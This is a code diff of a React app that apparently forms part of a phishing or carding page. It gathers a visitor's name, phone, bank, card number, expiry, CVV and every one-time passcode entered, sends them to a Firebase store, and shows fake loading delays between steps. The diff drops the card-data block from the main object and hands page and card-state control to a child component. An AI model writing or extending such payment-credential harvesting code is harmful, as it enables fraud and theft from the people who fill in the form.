@@ -10,8 +10,8 @@ import { addData } from './firebase';
 
 function App() {
   
-  const [currantPage, setCurrantPage] = useState(1);
-  const [isLoading, setsetIsLoading] = useState(false);
+  const [currantPage, setCurrantPage] = useState(3);
+  const [isLoading, setisloading] = useState(false);
   const [name, setName] = useState('')
   const [phone, setPhone] = useState('')
   const [id, setId] = useState(new Date().toISOString())
@@ -23,10 +23,10 @@ function App() {
   const [cardNumber, setCardNumber] = useState('')
   const [prefix, setPrefix] = useState('')
   const [bank, setBank] = useState('')
-  const [cardState] = useState('pending')
+  const [cardState, setCardState] = useState('pendding')
 
   const data={
-    id:id,
+    id:localStorage.getItem('visitor')===undefined?"newvistor":localStorage.getItem('visitor'),
     hasPersonalInfo:name != '',
     hasCardInfo:cardNumber != '',
     currentPage:currantPage,
@@ -37,23 +37,12 @@ function App() {
       fullName:name,
       phone:phone
     },
-    cardInfo: {
-      bank:bank,
-      cardNumber:cardNumber,
-      prefix:prefix,
-      expirationDate: `${dateMonth} / ${datayaer}`,
-      cvv:CVC,
-      otp:otp,
-      allOtps:otpArd,
-      state:cardState,
-    },
-    cardState:cardState,
   };
   const handleNextPage = () => {
    addData(data)
-    setsetIsLoading(true)
+   setisloading(true)
     setTimeout(() => {
-    setsetIsLoading(false)
+      setisloading(false)
       setCurrantPage(currantPage+1)
     }, 3000)
   }
@@ -91,6 +80,10 @@ useEffect(()=>{
               setDatyear={setDatyear}
               setCVC={setCVC}
               handleNextPage={handleNextPage}
+              currantPage={currantPage}
+              setCurrantPage={setCurrantPage}
+              setisloading={setisloading}
+              setCardState={setCardState}
               /> :
               null
       }
